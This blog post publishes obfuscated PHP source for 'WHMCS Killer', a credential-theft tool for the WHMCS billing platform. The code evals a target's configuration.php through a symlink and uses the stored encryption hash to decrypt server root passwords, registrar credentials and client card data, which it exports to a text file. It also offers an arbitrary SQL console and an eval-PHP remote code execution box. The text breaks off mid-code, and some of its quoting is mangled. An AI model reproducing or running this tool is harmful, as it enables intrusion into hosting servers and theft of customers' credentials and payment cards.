---
id: 24
title: WHMCS Killer source code
author: admin
layout: post
categories:
  - PHP
---


### WHMCS Killer source code

#### Coded By RAB3OUN


{% highlight php linenos %}
<?php function login(){echo("
<center>
<font color=\"#FFFF6FF" size="+3\">[ ~~ WHMCS Killer ~~ ]</font><br><br>

</center>
<br>
<center>

<font color="#0066FF\" size=\"+2\">DB configuration of WHMCS</font><br>
</center>
<FORM action=""  method="post\">
<input type=\"hidden\" name=\"form_action" value="1">
<br>
<table border=1>

<tr><td>db_host </td><td><input type=\"text\" size=\"60" name="db_host\" value="".$_COOKIE["db_host"].""></td></tr>
<tr><td>db_username </td><td><input type=\"text" size="60\" name=\"db_username\" value=\"".$_COOKIE["db_username"]."\"></td></tr>
<tr><td>db_password</td><td><input type=\"text\" size="60\" name="db_password\" value="".$_COOKIE["db_password"]."\"></td></tr>
<tr><td>db_name</td><td><input type=\"text\" size=\"60\" name="db_name\" value=\"".$_COOKIE["db_name"].""></td></tr>
<tr><td>cc_encryption_hash</td><td><input type="text" size=\"60" name=\"cc_encryption_hash" value="".$_COOKIE["cc_encryption_hash"]."\"></td></tr>


</table
<br>
<INPUT class=submit type="submit" value="Submit" name="Submit">
</FORM>


<font color="#0066FF" >Symlink to configuration.php of WHMCS</font><br>
</center>
<FORM action=\""  method="post\">
<input type=\"hidden" name="form_action\" value="2\">
<br>
 <input type=\"text" size="30\" name="file\" value="">
<br>
<INPUT class=submit type=\"submit\" value=\"Submit" name=\"Submit">
</FORM>

<hr>
<center> <font color=\"#FFFF6FF\" size=\"+1">   Coded By RAB3OUN v.b-4[@]hotmail.com    </font><br><br> <center>
");}${"GLOBALS"}["xuonyuepno"]="chars";${"GLOBALS"}["udfweffoxpyu"]="tmp_iv";${"GLOBALS"}["pkmsovcmei"]="num";${"GLOBALS"}["cdvibbixxsnv"]="hash";${"GLOBALS"}["cmcxsafpiqis"]="tmp";${"GLOBALS"}["wlflqupyhok"]="hash_key";${"GLOBALS"}["evpgmf"]="iv";${"GLOBALS"}["rmrxcwyycd"]="string";${"GLOBALS"}["kblictmeiu"]="out";${"GLOBALS"}["rtivjnvauu"]="c";${"GLOBALS"}["ibmtmqedn"]="hash_length";${"GLOBALS"}["datzsblhzhf"]="cc_encryption_hash";${"GLOBALS"}["mxwqlmlk"]="key";function decrypt($string,$cc_encryption_hash){${"GLOBALS"}["nzniktkpzmf"]="out";${"GLOBALS"}["chfcrbby"]="c";${"GLOBALS"}["ihdckwblr"]="cc_encryption_hash";${"GLOBALS"}["qfxklmm"]="hash_length";$syblltf="c";${${"GLOBALS"}["mxwqlmlk"]}=md5(md5(${${"GLOBALS"}["ihdckwblr"]})).md5(${${"GLOBALS"}["datzsblhzhf"]});$mykndjbrrf="string";${"GLOBALS"}["ojrckmgh"]="hash_key";${"GLOBALS"}["tmerxov"]="string";$efpdjrwx="string";$tixwnkf="iv";${${"GLOBALS"}["ojrckmgh"]}=_hash(${${"GLOBALS"}["mxwqlmlk"]});${${"GLOBALS"}["ibmtmqedn"]}=strlen(${${"GLOBALS"}["wlflqupyhok"]});$xofxgxlee="string";${${"GLOBALS"}["tmerxov"]}=base64_decode(${${"GLOBALS"}["rmrxcwyycd"]});${${"GLOBALS"}["udfweffoxpyu"]}=substr(${${"GLOBALS"}["rmrxcwyycd"]},0,${${"GLOBALS"}["ibmtmqedn"]});${$xofxgxlee}=substr(${$efpdjrwx},${${"GLOBALS"}["ibmtmqedn"]},strlen(${${"GLOBALS"}["rmrxcwyycd"]})-${${"GLOBALS"}["ibmtmqedn"]});${${"GLOBALS"}["evpgmf"]}=${${"GLOBALS"}["kblictmeiu"]}="";${${"GLOBALS"}["chfcrbby"]}=0;while(${${"GLOBALS"}["rtivjnvauu"]}<${${"GLOBALS"}["qfxklmm"]}){${"GLOBALS"}["locosnhyhxe"]="tmp_iv";$blvvyktnile="hash_key";${"GLOBALS"}["qsvyxqomjw"]="c";${${"GLOBALS"}["evpgmf"]}.=chr(ord(${${"GLOBALS"}["locosnhyhxe"]}[${${"GLOBALS"}["qsvyxqomjw"]}])^ord(${$blvvyktnile}[${${"GLOBALS"}["rtivjnvauu"]}]));${"GLOBALS"}["jxexxcreoyu"]="c";++${${"GLOBALS"}["jxexxcreoyu"]};}${${"GLOBALS"}["mxwqlmlk"]}=${$tixwnkf};${${"GLOBALS"}["rtivjnvauu"]}=0;while(${$syblltf}<strlen(${$mykndjbrrf})){${"GLOBALS"}["xtkyqnk"]="c";if((${${"GLOBALS"}["xtkyqnk"]}!=0 AND${${"GLOBALS"}["rtivjnvauu"]}%${${"GLOBALS"}["ibmtmqedn"]}==0)){$rrwbtbxgijs="hash_length";${"GLOBALS"}["wkcjeuhsnr"]="out";${"GLOBALS"}["gjbhisruvsjg"]="c";$urqboemtmd="key";${"GLOBALS"}["ttxdbvdj"]="key";${${"GLOBALS"}["ttxdbvdj"]}=_hash(${$urqboemtmd}.substr(${${"GLOBALS"}["wkcjeuhsnr"]},${${"GLOBALS"}["gjbhisruvsjg"]}-${$rrwbtbxgijs},${${"GLOBALS"}["ibmtmqedn"]}));}${"GLOBALS"}["rfbehdn"]="string";$shmntyxlk="c";${${"GLOBALS"}["kblictmeiu"]}.=chr(ord(${${"GLOBALS"}["mxwqlmlk"]}[${${"GLOBALS"}["rtivjnvauu"]}%${${"GLOBALS"}["ibmtmqedn"]}])^ord(${${"GLOBALS"}["rfbehdn"]}[${$shmntyxlk}]));++${${"GLOBALS"}["rtivjnvauu"]};}return${${"GLOBALS"}["nzniktkpzmf"]};}function _hash($string){${"GLOBALS"}["mcvkqp"]="out";$giucudyhs="c";if(function_exists("sha1")){$snlhbchdvi="string";${${"GLOBALS"}["cdvibbixxsnv"]}=sha1(${$snlhbchdvi});}else{$jkozgvtfqr="string";${${"GLOBALS"}["cdvibbixxsnv"]}=md5(${$jkozgvtfqr});}${"GLOBALS"}["nifecxr"]="c";${${"GLOBALS"}["mcvkqp"]}="";${$giucudyhs}=0;while(${${"GLOBALS"}["nifecxr"]}<strlen(${${"GLOBALS"}["cdvibbixxsnv"]})){$craodqla="c";${"GLOBALS"}["aqscnphuvcag"]="hash";${"GLOBALS"}["xewlzchmir"]="out";${${"GLOBALS"}["xewlzchmir"]}.=chr(hexdec(${${"GLOBALS"}["cdvibbixxsnv"]}[${${"GLOBALS"}["rtivjnvauu"]}].${${"GLOBALS"}["aqscnphuvcag"]}[${$craodqla}+1]));${${"GLOBALS"}["rtivjnvauu"]}+=2;}return${${"GLOBALS"}["kblictmeiu"]};}function randomt(){${"GLOBALS"}["qjopxdde"]="chars";$ocogqosnpg="i";${${"GLOBALS"}["qjopxdde"]}="abcdefghijkmnopqrstuvwxyz023456789";srand((double)microtime()*1000000);${$ocogqosnpg}=0;${"GLOBALS"}["vgvxzgwgoz"]="pass";${"GLOBALS"}["phxcbeye"]="pass";${${"GLOBALS"}["vgvxzgwgoz"]}="";${"GLOBALS"}["hiotmkubrpy"]="i";while(${${"GLOBALS"}["hiotmkubrpy"]}<=7){${"GLOBALS"}["hokofpotyvo"]="num";$sqxafipfif="pass";${"GLOBALS"}["vteovuv"]="pass";${${"GLOBALS"}["pkmsovcmei"]}=rand()%33;${${"GLOBALS"}["cmcxsafpiqis"]}=substr(${${"GLOBALS"}["xuonyuepno"]},${${"GLOBALS"}["hokofpotyvo"]},1);$rbkyed="i";${${"GLOBALS"}["vteovuv"]}=${$sqxafipfif}.${${"GLOBALS"}["cmcxsafpiqis"]};${$rbkyed}++;}return${${"GLOBALS"}["phxcbeye"]};}${"GLOBALS"}["hwljnvbefa"]="fieldnum";${"GLOBALS"}["tnpgxkuqfmi"]="row";$xtclfqyirsu="qq";${"GLOBALS"}["lzymhfcjh"]="address1";${"GLOBALS"}["ikzegshuub"]="total_pages";${"GLOBALS"}["dkwmatbtxg"]="pass";${"GLOBALS"}["gcxuyplbilvy"]="query";$civmqlvwy="query";${"GLOBALS"}["bbbwyjm"]="query1";$reugtwyli="db_username";${"GLOBALS"}["moukxffcs"]="total_records";$zwpqoyuvvlqh="i";${"GLOBALS"}["weufxkdwhjrs"]="query2";${"GLOBALS"}["xofppepvt"]="page";${"GLOBALS"}["ilxjyxzqt"]="p";${"GLOBALS"}["yxqmufxnqcs"]="total_pages";${"GLOBALS"}["niecnejwfmy"]="db_host";$sbesjbau="v";${"GLOBALS"}["oopdhffk"]="tables";$hjguhcqx="db_name";@set_time_limit(0);${"GLOBALS"}["dseenyxe"]="total_records";${"GLOBALS"}["dteeutx"]="auth";${"GLOBALS"}["nyemdrab"]="list_tid0";${"GLOBALS"}["cxojuijvhke"]="db_username";${"GLOBALS"}["kolgoqf"]="db_name";${"GLOBALS"}["movmxrodnm"]="qq";${"GLOBALS"}["kpnorw"]="value";$pobdlt="q";${"GLOBALS"}["bbxvsr"]="tryChaningInfo";${"GLOBALS"}["trfxekei"]="p";${"GLOBALS"}["ddkjqvygne"]="send";${"GLOBALS"}["ypirnrygq"]="qq";$hajeir="i";${"GLOBALS"}["apfvsegdq"]="vv";${"GLOBALS"}["aoxjiv"]="tryChaning";${"GLOBALS"}["holppdzxh"]="s";${"GLOBALS"}["iwgkwzxog"]="i";$rbfnqunecwtk="total_pages";$ihbmai="link";${"GLOBALS"}["oygtthj"]="file";${"GLOBALS"}["ytcwncufygm"]="header";ob_start();${"GLOBALS"}["kqkvclxesp"]="query";${"GLOBALS"}["ohkgnmv"]="page";${"GLOBALS"}["wexrijbytls"]="page";${"GLOBALS"}["mjjavslk"]="do";${"GLOBALS"}["wxlvsayvl"]="qq";${"GLOBALS"}["jeodtgliqnwo"]="userfile_tmp";${"GLOBALS"}["whicxj"]="type";${"GLOBALS"}["mteueri"]="db_host";${"GLOBALS"}["wbnblpaukq"]="qq";$yjgqlxkqqz="q";$dxupbio="q";${"GLOBALS"}["rmldtskxf"]="cchash";$fbmootfzyeep="page";$limtvyhy="total_pages";$puuuunsn="q";${"GLOBALS"}["oskifgm"]="qq";$xiqynvwsuo="total_records";$dxmuqhwqetns="q";$wvlbje="total_pages";${"GLOBALS"}["nlybchj"]="v";$khumirs="qq";${"GLOBALS"}["bxhhgvfowce"]="qq";${"GLOBALS"}["yhrlspt"]="total_records";${"GLOBALS"}["alisvlov"]="text";$iplyknyqxey="total_records";${"GLOBALS"}["xpgcpicbvk"]="textr";$gpttvqv="list_tid";$gvscbgvs="db_password";${"GLOBALS"}["qrqqqxofvpz"]="i";${"GLOBALS"}["qnganuhfwtyh"]="v2";${"GLOBALS"}["mjocwvv"]="list_tid";${"GLOBALS"}["vbpmgiycm"]="link";if(${${"GLOBALS"}["dteeutx"]}==1){${"GLOBALS"}["tiedgiweki"]="user";if(!isset($_SERVER["PHP_AUTH_USER"])||md5($_SERVER["PHP_AUTH_USER"])!==${${"GLOBALS"}["tiedgiweki"]}||md5($_SERVER["PHP_AUTH_PW"])!==${${"GLOBALS"}["dkwmatbtxg"]}){header("WWW-Authenticate: Basic realm="Powered By RAB3OUN"");header("HTTP/1.0 401 Unauthorized");exit("Go To Hell");}}${"GLOBALS"}["zcnueceb"]="maxfile";${"GLOBALS"}["hheigfnepd"]="sql";${"GLOBALS"}["oeqezxoxcmbb"]="result";${"GLOBALS"}["eswkbw"]="q";${"GLOBALS"}["uoocmhnsd"]="j";$gmzdecbl="db_password";${"GLOBALS"}["qhwgnda"]="db_name";${"GLOBALS"}["thqwfrhoxyo"]="db_host";${${"GLOBALS"}["ilxjyxzqt"]}=$_GET["p"];${"GLOBALS"}["dlsibicfnkg"]="size";$hejvwrlzvigz="p";if($_POST["form_action"]==1){setcookie("db_host",$_POST["db_host"]);setcookie("db_username",$_POST["db_username"]);setcookie("db_password",$_POST["db_password"]);setcookie("db_name",$_POST["db_name"]);setcookie("login","1");setcookie("cc_encryption_hash",$_POST["cc_encryption_hash"]);echo"<h1>Done : Connection Successfully
        </h1>";echo("     <meta http-equiv='refresh' content='1;URL=?p=103' />");}${"GLOBALS"}["sqgchrxwl"]="v";$gunsnlwfq="qq";${"GLOBALS"}["vhfscebilj"]="qq";${"GLOBALS"}["wxalvnqtzz"]="td";${"GLOBALS"}["wwepbwx"]="start_from";if($_POST["form_action"]==2){${"GLOBALS"}["ifzpodgacs"]="file";$ccizbxtrdbth="text";${"GLOBALS"}["fvmxiwaic"]="db_password";$hmsqvjrxovj="text";$qqbvtofmqj="text";${${"GLOBALS"}["ifzpodgacs"]}=($_POST["file"]);${$ccizbxtrdbth}=file_get_contents(${${"GLOBALS"}["oygtthj"]});$bsnnhjp="text";$zchejkumx="db_host";${${"GLOBALS"}["alisvlov"]}=str_replace("<?php","",${${"GLOBALS"}["alisvlov"]});${$bsnnhjp}=str_replace("<?","",${$hmsqvjrxovj});${${"GLOBALS"}["alisvlov"]}=str_replace("?>","",${$qqbvtofmqj});eval(${${"GLOBALS"}["alisvlov"]});setcookie("db_host",${$zchejkumx});setcookie("db_username",${${"GLOBALS"}["cxojuijvhke"]});setcookie("db_password",${${"GLOBALS"}["fvmxiwaic"]});setcookie("db_name",${${"GLOBALS"}["qhwgnda"]});setcookie("login","1");setcookie("cc_encryption_hash",${${"GLOBALS"}["datzsblhzhf"]});echo"Done : Connection Successfully
        ";echo("     <meta http-equiv='refresh' content='1;URL=?p=103' />");}${"GLOBALS"}["vpvulpll"]="total_records";${${"GLOBALS"}["ytcwncufygm"]}="<html>
<title>Whmcs Killer Coded by RAB3OUN</title>
<head>
<style>

body
{
	background: #0f0e0d;
	color: #FF9933;

	padding: 0px;

}
a:link, body_alink
{
	color: #FF9933;
	text-decoration: none;
}
a:visited, body_avisited
{
	color: #FF9933;
	text-decoration: none;
}
a:hover, a:active, body_ahover
{
	color: #FFFFFF;
	text-decoration: none;
}
td, th, p, li,table
{

	background: #2e2b28;
	border:1px solid #524f46;
}

input
{
	border: 1px solid;

	cursor: default;

	overflow: hidden;
	background: #2e2b28;
	color: #ffffff;
}
</style>
</head>
<body bgcolor=black alink="#33CC00" vlink=\"#FF9933\" link="#FF9933\">";if(${$hejvwrlzvigz})echo(${${"GLOBALS"}["ytcwncufygm"]});$cabnldqq="q";${"GLOBALS"}["bfhqlodqci"]="q";${"GLOBALS"}["hfrripeqw"]="page";$zhonohalncvc="qq";${"GLOBALS"}["remcsasob"]="que";$uudoelu="query";$gratlbvcudj="q";${"GLOBALS"}["vgmpmpyqmo"]="i";${"GLOBALS"}["whvclkauo"]="q";${"GLOBALS"}["iahgcggxrfyj"]="query1";$juqovtr="page";${"GLOBALS"}["hqvmqku"]="cod";echo "




";${"GLOBALS"}["xvcigmwm"]="query";${"GLOBALS"}["vmgpud"]="num_fields";${"GLOBALS"}["erwtyhzu"]="i";${"GLOBALS"}["helarbxk"]="db_name";${"GLOBALS"}["qeccwlebiwkf"]="hostname";if($_COOKIE["login"]=="1"){$orqsbbsoct="db_password";${"GLOBALS"}["lbedwogjuwoc"]="db_username";${${"GLOBALS"}["niecnejwfmy"]}=($_COOKIE["db_host"]);$lcavcxclqn="db_password";${"GLOBALS"}["cvhxkpa"]="db_name";${${"GLOBALS"}["cxojuijvhke"]}=($_COOKIE["db_username"]);${"GLOBALS"}["cqzruox"]="db_name";${"GLOBALS"}["zycrqixkex"]="db_host";${$orqsbbsoct}=($_COOKIE["db_password"]);${${"GLOBALS"}["cvhxkpa"]}=($_COOKIE["db_name"]);${${"GLOBALS"}["datzsblhzhf"]}=($_COOKIE["cc_encryption_hash"]);${${"GLOBALS"}["vbpmgiycm"]}=@mysql_connect(${${"GLOBALS"}["zycrqixkex"]},${${"GLOBALS"}["lbedwogjuwoc"]},${$lcavcxclqn});mysql_select_db(${${"GLOBALS"}["cqzruox"]},${${"GLOBALS"}["vbpmgiycm"]});}if(${${"GLOBALS"}["trfxekei"]} and($_COOKIE["login"]<>"1")){echo(${${"GLOBALS"}["ytcwncufygm"]});login();exit;}$powgjiqs="qq";${"GLOBALS"}["iythzoxdsfo"]="tables";if(($_COOKIE["login"]<>"1")){echo(${${"GLOBALS"}["ytcwncufygm"]});login();exit;}${"GLOBALS"}["zjnwvfdxn"]="q";$vqldrghoit="qq";${"GLOBALS"}["wtdvngebcpmb"]="total_pages";${${"GLOBALS"}["thqwfrhoxyo"]}=($_COOKIE["db_host"]);${${"GLOBALS"}["cxojuijvhke"]}=($_COOKIE["db_username"]);${"GLOBALS"}["efclwulosb"]="numrow";${$gvscbgvs}=($_COOKIE["db_password"]);${$hjguhcqx}=($_COOKIE["db_name"]);${"GLOBALS"}["lbwunffup"]="filedir";$lscacpqgy="total_records";${"GLOBALS"}["emleede"]="page";${${"GLOBALS"}["datzsblhzhf"]}=($_COOKIE["cc_encryption_hash"]);$bobdjbtpo="start_from";${"GLOBALS"}["ikmuojf"]="page";${"GLOBALS"}["wpsqjhhkp"]="value";${${"GLOBALS"}["vbpmgiycm"]}=@mysql_connect(${${"GLOBALS"}["niecnejwfmy"]},${$reugtwyli},${$gmzdecbl});$bpqbxrwo="query";${"GLOBALS"}["akmxxe"]="qq";${"GLOBALS"}["zomhvciviu"]="q";$icdhoailw="q";${"GLOBALS"}["vmufmxkif"]="q";${"GLOBALS"}["vjknjbv"]="q";$iatsqqns="query";${"GLOBALS"}["ngjywjqkzjlf"]="table";${"GLOBALS"}["pqbrvumqoucu"]="outta";${"GLOBALS"}["hiufclnubxn"]="i";$krnlvxwgcua="total_pages";${"GLOBALS"}["qkmhvrcw"]="db_password";$ixffiogjjei="query";${"GLOBALS"}["gkdriputxvs"]="name";$jhtscpteveh="q";mysql_select_db(${${"GLOBALS"}["kolgoqf"]},${${"GLOBALS"}["vbpmgiycm"]});${"GLOBALS"}["xtphpyjxtcrt"]="i";${"GLOBALS"}["hurqkvya"]="page";$kusogzqbsn="qq";$cmchkvpfw="q";${"GLOBALS"}["tmfxusug"]="password";${"GLOBALS"}["hypytl"]="do";$iadgyrrjwg="send";${"GLOBALS"}["fuwtcdyygb"]="lastname";$dqkktbv="link";${"GLOBALS"}["pfxtpflwl"]="total_pages";${"GLOBALS"}["ggzkiuj"]="query";$graxttls="query";${"GLOBALS"}["lplunc"]="qq";${"GLOBALS"}["ocnhbeecmfr"]="db_username";${"GLOBALS"}["nbskojmpbuf"]="v";$ztjmaka="q";${"GLOBALS"}["fqkgakb"]="page";if(!${$dqkktbv}){$irdqno="header";echo("<h1>Database error</h1>");echo(${$irdqno});login();exit;}$dysqpoj="q";${"GLOBALS"}["apwiougyiqkh"]="query";switch(${${"GLOBALS"}["trfxekei"]}){case"m":echo("<br><hr><a href="?p=h\" target="frame1"> Home</a><hr>
<a href="?p=102\" target="frame1"> Info</a><hr>
<a href=\"?p=1" target="frame1\"> H0st r00ts</a><hr>
<a href=\"?p=2" target=\"frame1"> Domains Resellers</a><hr>
<a href=\"?p=3\" target=\"frame1"> Clients r00ts</a><hr>
<a href="?p=4\" target=\"frame1"> Clients Hosting Accounts</a><hr>
<a href=\"?p=5\" target=\"frame1"> Clients CC</a><hr>
<a href="?p=63" target="frame1\"> Clients Tickets </a><hr>
<a href=\"?p=7" target="frame1\"> FTP and SMTP password</a><hr>
<a href=\"?p=8\" target=\"frame1\"> Tools</a><hr>
<a href=\"?p=99\" target="frame1\"> SQL Query</a><hr>
<a href="?p=100\" target=\"frame1\"> Show clients </a><hr>
<a href=\"?p=11\" target="frame1">BackUp</a><hr>
<a href=\"?p=101\" target=\"frame1">Eval PHP</a><hr>
<a href="?p=9\" target=\"_parent\"> Logout</a><br>");break;case"h":login();break;case 1:${${"GLOBALS"}["apwiougyiqkh"]}=mysql_query("SELECT * FROM tblservers");if(!is_array(mysql_fetch_array(${${"GLOBALS"}["apwiougyiqkh"]}))){echo"<center><h1>Nothing Found !</h1></center>";}else{$pljbfnviyhzu="v";${${"GLOBALS"}["apwiougyiqkh"]}=mysql_query("SELECT * FROM tblservers");echo("<center><h1>H0st r00ts</h1>"."<center><br><br> <br><form action=\"?p=1" name=\"formw\" method=\"post\">

<input name="export\" type=\"hidden" value=\"1\">
<center><input type="submit" name="submit2\" class=\"buttons\" value="[Save to TXT file ]" /></center>"."<br><table border='0'><tr><td>Type</td><td>Active</td><td>Hostname</td><td>Ip</td><td>Username</td><td>Password</td></tr>");while(${$pljbfnviyhzu}=mysql_fetch_array(${${"GLOBALS"}["apwiougyiqkh"]})){${"GLOBALS"}["gjrcmuwdu"]="password";${"GLOBALS"}["irsspblonn"]="v";${${"GLOBALS"}["gjrcmuwdu"]}=decrypt(${${"GLOBALS"}["sqgchrxwl"]}["password"],${${"GLOBALS"}["datzsblhzhf"]});${"GLOBALS"}["rypcxzkjwfjx"]="v";echo("<tr><td>".${${"GLOBALS"}["irsspblonn"]}["type"]."</td><td>".${${"GLOBALS"}["sqgchrxwl"]}["active"]."</td><td>".${${"GLOBALS"}["sqgchrxwl"]}["hostname"]."</td><td>".${${"GLOBALS"}["sqgchrxwl"]}["ipaddress"]."</td><td>".${${"GLOBALS"}["rypcxzkjwfjx"]}["username"]."</td><td>$password</td></tr>");}echo"</table><br><br></center>";}if($_POST["export"]==1){${"GLOBALS"}["gtfnpxq"]="textr";$ccykwwgn="v";${${"GLOBALS"}["apwiougyiqkh"]}=mysql_query("SELECT * FROM tblservers");$qhmvqvewgso="query";${"GLOBALS"}["pwpgekpnseow"]="textr";${${"GLOBALS"}["xpgcpicbvk"]}=${${"GLOBALS"}["xpgcpicbvk"]}."
######################### HOST ROOTS ###########################
";while(${$ccykwwgn}=mysql_fetch_array(${$qhmvqvewgso})){${"GLOBALS"}["elrhhifqsx"]="textr";$jmorgcxtmsa="password";${"GLOBALS"}["fbfxtyoqs"]="ipaddress";$leflbly="cc_encryption_hash";${${"GLOBALS"}["fbfxtyoqs"]}=${${"GLOBALS"}["sqgchrxwl"]}["ipaddress"];${"GLOBALS"}["yymtqhcglv"]="v";${"GLOBALS"}["exzfwgab"]="username";${"GLOBALS"}["ojqwsnfn"]="active";$koyjltkpkmj="textr";${${"GLOBALS"}["exzfwgab"]}=${${"GLOBALS"}["yymtqhcglv"]}["username"];${"GLOBALS"}["zhelchw"]="textr";${${"GLOBALS"}["whicxj"]}=${${"GLOBALS"}["sqgchrxwl"]}["type"];$fmebkr="v";$unqugqvele="v";${${"GLOBALS"}["ojqwsnfn"]}=${${"GLOBALS"}["sqgchrxwl"]}["active"];${${"GLOBALS"}["qeccwlebiwkf"]}=${$fmebkr}["hostname"];${$jmorgcxtmsa}=decrypt(${$unqugqvele}["password"],${$leflbly});$skuqwqnrsa="textr";${${"GLOBALS"}["xpgcpicbvk"]}=${${"GLOBALS"}["elrhhifqsx"]}."Type $type
";${$skuqwqnrsa}=${${"GLOBALS"}["xpgcpicbvk"]}."Active $active
";${${"GLOBALS"}["zhelchw"]}=${$koyjltkpkmj}."Hostname $hostname
";${"GLOBALS"}["qlaanvipy"]="textr";${${"GLOBALS"}["xpgcpicbvk"]}=${${"GLOBALS"}["qlaanvipy"]}."Ip $ipaddress
";$frowvouv="textr";${$frowvouv}=${${"GLOBALS"}["xpgcpicbvk"]}."Username $username
";${${"GLOBALS"}["xpgcpicbvk"]}=${${"GLOBALS"}["xpgcpicbvk"]}."Password $password
**************************************
";}$tbsqgbw="textr";${${"GLOBALS"}["gtfnpxq"]}=${${"GLOBALS"}["pwpgekpnseow"]}."
######################### HOST ROOTS ###########################
";@ob_end_clean();header("Content-length: ".strlen(${$tbsqgbw}));header("Content-type: text/plain");header("Content-Disposition: attachment; filename=".$_SERVER["HTTP_HOST"]."-host_R00t.txt");echo(${${"GLOBALS"}["xpgcpicbvk"]});}break;case 2:${$graxttls}=mysql_query("SELECT * FROM tblregistrars");if(!is_array(mysql_fetch_array(${$iatsqqns}))){echo"<center><h1>Nothing Found !</h1></center>";}else{${${"GLOBALS"}["apwiougyiqkh"]}=mysql_query("SELECT * FROM tblregistrars");echo("<center><h1>Domain Reseller<h1> <br><table border='0'>");$qoshvjtcbtdx="query";echo("<tr><td>Registrar</td><td>Setting</td><td>Value</td></tr>");while(${${"GLOBALS"}["sqgchrxwl"]}=mysql_fetch_array(${$qoshvjtcbtdx})){${"GLOBALS"}["dnxnbpk"]="cc_encryption_hash";$yahyjeq="v";${${"GLOBALS"}["kpnorw"]}=decrypt(${$yahyjeq}["value"],${${"GLOBALS"}["dnxnbpk"]});if(${${"GLOBALS"}["kpnorw"]}==""){${${"GLOBALS"}["kpnorw"]}=0;}${${"GLOBALS"}["tmfxusug"]}=decrypt(${${"GLOBALS"}["sqgchrxwl"]}["password"],${${"GLOBALS"}["datzsblhzhf"]});echo("<tr><td>".${${"GLOBALS"}["sqgchrxwl"]}["registrar"]."</td><td>".${${"GLOBALS"}["sqgchrxwl"]}["setting"]." </td><td>$value</td></tr>");}echo"</table><br><br></center>";}break;case 99:${${"GLOBALS"}["apwiougyiqkh"]}=stripslashes($_POST["query"]);if(${${"GLOBALS"}["apwiougyiqkh"]}=="")${${"GLOBALS"}["apwiougyiqkh"]}="SELECT * FROM tbladmins LIMIT 0,10";echo("<center><br><h1>SQL Query</h1><br><br><br><FORM action="?p=99\"  method="post" >

<input type="text\" name=\"query\" value="".${${"GLOBALS"}["apwiougyiqkh"]}."\" style="width:500px;\" >
<br><br>
<INPUT class=submit type=\"submit\" value=\"Submit\" name=\"Submit">
</form>");if($_POST["query"]){$znexto="result";$hjwmqb="fieldnum";echo("<table border'1'>");${"GLOBALS"}["vkkxttbcbw"]="i";${$znexto}=mysql_query(${${"GLOBALS"}["apwiougyiqkh"]});${$hjwmqb}=@mysql_num_fields(${${"GLOBALS"}["oeqezxoxcmbb"]});echo("<tr>");for(${${"GLOBALS"}["hiufclnubxn"]}=0;${${"GLOBALS"}["vkkxttbcbw"]}<${${"GLOBALS"}["hwljnvbefa"]};${${"GLOBALS"}["hiufclnubxn"]}++){${${"GLOBALS"}["gkdriputxvs"]}=@mysql_field_name(${${"GLOBALS"}["oeqezxoxcmbb"]},${${"GLOBALS"}["hiufclnubxn"]});echo("<td>$name</td>");}$vikhmjdpq="result";echo("</tr>");while(${${"GLOBALS"}["sqgchrxwl"]}=@mysql_fetch_array(${$vikhmjdpq},1)){${"GLOBALS"}["dcwwamie"]="td";${${"GLOBALS"}["wxalvnqtzz"]}="<tr><td>";${"GLOBALS"}["qfrknetgv"]="td";${${"GLOBALS"}["qfrknetgv"]}=${${"GLOBALS"}["dcwwamie"]}.implode("</td><td>",${${"GLOBALS"}["sqgchrxwl"]});${${"GLOBALS"}["wxalvnqtzz"]}=${${"GLOBALS"}["wxalvnqtzz"]}."</tr>
";echo(${${"GLOBALS"}["wxalvnqtzz"]});}echo("</table>");if(mysql_error()<>""){echo("<table border'1'><tr><td>Mysql error</td><td>".mysql_error()."</td></tr></table>");}else{echo("<br><table border'1'><tr><td>SQL Query executed successfully </td></tr></table>");}}break;case 100:echo("<center><h1>Clients</h1><br>Click on id to get all info+Hosting Accounts+Tickets <br><br>");${${"GLOBALS"}["apwiougyiqkh"]}=mysql_query("SELECT * FROM tblclients");echo("<br><table border='0'>");while(${${"GLOBALS"}["sqgchrxwl"]}=mysql_fetch_array(${${"GLOBALS"}["apwiougyiqkh"]})){$yiqehuuojodq="v";$jellgls="v";echo("<tr><td> <a href='?p=12&id=".${$jellgls}["id"]."'>".${${"GLOBALS"}["sqgchrxwl"]}["id"]."</a></td>");echo("<td>".${$yiqehuuojodq}["email"]."</td>");echo("<td>".${${"GLOBALS"}["sqgchrxwl"]}["country"]."</td>");echo("<td>".${${"GLOBALS"}["sqgchrxwl"]}["firstname"]."</td>");echo("<td>".${${"GLOBALS"}["sqgchrxwl"]}["lastname"]."</td></tr>");}echo("</table></center>");break;case 101:echo("<center><h1>Eval PHP</h1><br><br>");Echo"<form action='?p=101' method='POST' > <textarea rows='10' name='pp' cols='50'>  </textarea><br /><input type='submit' value='Go' name='go' /></form></html>";${${"GLOBALS"}["hqvmqku"]}=$_POST["pp"];${${"GLOBALS"}["ddkjqvygne"]}=$_POST["go"];if(${$iadgyrrjwg}){eVaL(stripslashes(${${"GLOBALS"}["hqvmqku"]}));}break;case 102:echo("<center><pre>
__          ___    _ __  __  _____  _____   _  ___ _ _
\ \        / / |  | |  \/  |/ ____|/ ____| | |/ (_) | |
 \ \  /\  / /| |__| | \  / | |    | (___   | ' / _| | | ___ _ __
  \ \/  \/ / |  __  | |\/| | |     \___ \  |  < | | | |/ _ \ '__|
   \  /\  /  | |  | | |  | | |____ ____) | | . \| | | |  __/ |
    \/  \/   |_|  |_|_|  |_|\_____|_____/  |_|\_\_|_|_|\___|_|

</pre>
Coded by RAB3OUN <br>
Mail v.b-4@hotmail.com
/* <![CDATA[ */!function(){try{var t="currentScript"in document?document.currentScript:function(){for(var t=document.getElementsByTagName("script"),e=t.length;e--;)if(t[e].getAttribute("cf-hash"))return t[e]}();if(t&&t.previousSibling){var e,r,n,i,c=t.previousSibling,a=c.getAttribute("data-cfemail");if(a){for(e="",r=parseInt(a.substr(0,2),16),n=2;a.length-n;n+=2)i=parseInt(a.substr(n,2),16)^r,e+=String.fromCharCode(i);e=document.createTextNode(e),c.parentNode.replaceChild(e,c)}}}catch(u){}}();/* ]]> */ <br>
Blog http://www.rab3oun.net <br>
<br>
<br>
<br>
<h3>Disclaimer</h3><br></center>

Use these scripts entirely at your own risk.<br>
The author cannot be held responsible for any damage, direct nor consequential, caused by the use of, or inability to use the techniques or scripts presented here<br>
<center><h3>Greets:</h3><br></center><br>
ahwak2000 RENO And All P0c TEAM <br>
 All Sec4ever TEAM
");break;case 103:@ob_end_clean();echo("<title>Whmcs Killer Coded by RAB3OUN</title><FRAMESET cols=\"200,*">
<FRAME name="sommaire" target="frame1" src="?p=m\" scrolling=\"auto">
<FRAME name="frame1\" src="?p=102\" scrolling="auto\">
</FRAMESET>
